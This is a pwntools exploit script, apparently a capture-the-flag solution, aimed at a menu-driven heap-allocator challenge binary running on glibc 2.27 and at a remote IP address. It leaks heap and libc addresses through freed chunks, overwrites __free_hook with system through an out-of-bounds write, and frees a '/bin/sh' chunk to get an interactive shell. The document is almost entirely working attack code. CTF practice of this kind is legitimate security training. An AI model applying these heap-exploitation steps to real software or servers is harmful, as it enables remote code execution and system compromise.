from pwn import*
context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('Your choice:',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Size: ',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('Index: ',str(index))
	p.sendafter('Content: ',content)
def show(index):
	menu(3)
	p.sendlineafter('Index: ',str(index))
def free(index):
	menu(4)
	p.sendlineafter('Index: ',str(index))
def m_new(index):
	menu(6)
	p.sendlineafter('start: ',str(index))
def m_edit(index,value):
	menu(7)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Value: ',str(value))
def m_free():
	menu(8)
p = process('./main')
libc =ELF('./libc-2.27.so')
p = remote('106.14.214.3',2333)
for i in range(8):
	new(i,0x100)
for i in range(8):
	free(7 - i)
for i in range(7):
	new(i + 1,0x100)

show(1)
p.recvuntil('Content: ')
heap_base = u32(p.recv(4)) - 0x380
log.info('HEAP:\t' + hex(heap_base))

new(0,0x78)
new(8,0x78)
edit(1,'/bin/sh\n')
show(0)
libc_base = u32(p.recvuntil('\xF7')[-4:]) - libc.sym['__malloc_hook'] - 0xD8
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
log.info('LIBC:\t' + hex(libc_base))
rce = libc_base + 0x3D130
m_new(0)
address = ((free_hook - 0xE0000000)>>2)
m_edit(address,system)
free(1)

p.interactive()
